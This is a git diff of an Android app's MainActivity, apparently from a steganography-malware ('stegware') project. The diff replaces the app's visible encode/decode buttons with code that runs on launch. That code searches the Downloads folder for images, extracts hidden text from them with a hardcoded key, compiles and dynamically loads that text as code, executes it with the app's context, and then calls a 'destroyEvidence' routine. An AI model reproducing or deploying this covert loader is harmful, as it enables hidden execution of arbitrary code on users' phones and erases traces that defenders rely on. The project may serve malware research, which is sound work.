@@ -4,9 +4,14 @@ import android.Manifest;
 import android.app.job.JobInfo;
 import android.app.job.JobScheduler;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
+import android.provider.MediaStore;
 import android.util.Log;
 import android.widget.Button;
 
@@ -14,12 +19,25 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.android.stegware_app.compile_utility.Compile;
+import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
+import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
 import com.android.stegware_app.jobs.MediaSearchJob;
+import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
+import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
+import com.ayush.imagesteganographylibrary.Text.TextDecoding;
 
+import java.io.File;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
 
-public class MainActivity extends AppCompatActivity {
+import dx.command.Main;
+import javassist.NotFoundException;
+
+public class MainActivity extends AppCompatActivity implements TextDecodingCallback {
 
     public static final String TAG = "MainActivity";
 
@@ -30,28 +48,10 @@ public class MainActivity extends AppCompatActivity {
 
         checkAndRequestPermissions();
 
-        Button encode = findViewById(R.id.encode_button);
-
-        encode.setOnClickListener(view -> startActivity(new Intent(getApplicationContext(), Encode.class)));
-
-        Button decode = findViewById(R.id.decode_button);
-
-        decode.setOnClickListener(view -> startActivity(new Intent(getApplicationContext(), Decode.class)));
-
-//        Intent intent = new Intent(getApplicationContext(), MediaSearchService.class);
-//        startService(intent);
-
-        // Creation and start of Job
-        JobInfo.Builder builder = new JobInfo.Builder(1, new ComponentName(getApplicationContext(), MediaSearchJob.class.getName()));
-        JobInfo job = builder.build();
-        JobScheduler scheduler = (JobScheduler) MainActivity.this.getSystemService(JOB_SCHEDULER_SERVICE);
-
-        int result = scheduler.schedule(job);
-
-        if (result == JobScheduler.RESULT_SUCCESS) {
-            Log.d(TAG, "Job started");
-        } else {
-            Log.d(TAG, "Job error");
+        try {
+            getImage();
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
         }
     }
 
@@ -70,6 +70,80 @@ public class MainActivity extends AppCompatActivity {
 
         if (!listPermissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 1);
+        }
+    }
+
+    private void getImage() throws IOException, InterruptedException {
+        String path = Environment.getExternalStorageDirectory().toString() + "/" + Environment.DIRECTORY_DOWNLOADS;
+
+        File directory = new File(path);
+        File[] files = directory.listFiles();
+
+        if (files != null) {
+            for (File file : files) {
+                Log.d(TAG, file.getName());
+                Log.d(TAG, file.getPath());
+                Log.d(TAG, Uri.fromFile(file).toString());
+
+                Thread.sleep(2000);
+
+                if (file.getName().contains("Encoded")) {
+                    Bitmap img = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(file));
+                    ImageSteganography imageSteganography = new ImageSteganography("a", img);
+
+                    TextDecoding textDecoding = new TextDecoding(MainActivity.this, MainActivity.this); // Need activity
+
+                    //Execute Task
+                    textDecoding.execute(imageSteganography);
+                }
+            }
+        }
+    }
+
+    private void dynamicCompiling(Context context, String code) {
+        Compile compile = new Compile(context.getFilesDir(), context, code);
+
+        try {
+            compile.parseSourceCode();
+            compile.assemblyCompile();
+            compile.compile();
+            compile.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
+            Object obj = compile.run();
+
+            String _result = "";
+
+            Method method = obj.getClass().getDeclaredMethod("run", Context.class);
+            _result = (String) method.invoke(obj, context);
+
+            compile.destroyEvidence();
+
+            Log.d(TAG, "Method res: " + _result);
+        } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void onStartTextEncoding() {
+        //Whatever you want to do by the start of textDecoding
+    }
+
+    @Override
+    public void onCompleteTextEncoding(ImageSteganography result) {
+        if (result != null) {
+            if (!result.isDecoded())
+                Log.d(TAG, "No message found");
+            else {
+                if (!result.isSecretKeyWrong()) {
+                    Log.d(TAG, "Decoded");
+
+                    dynamicCompiling(getApplicationContext(), result.getMessage());
+                } else {
+                    Log.d(TAG, "Wrong secret key");
+                }
+            }
+        } else {
+            Log.d(TAG, "Select Image First");
         }
     }
 }
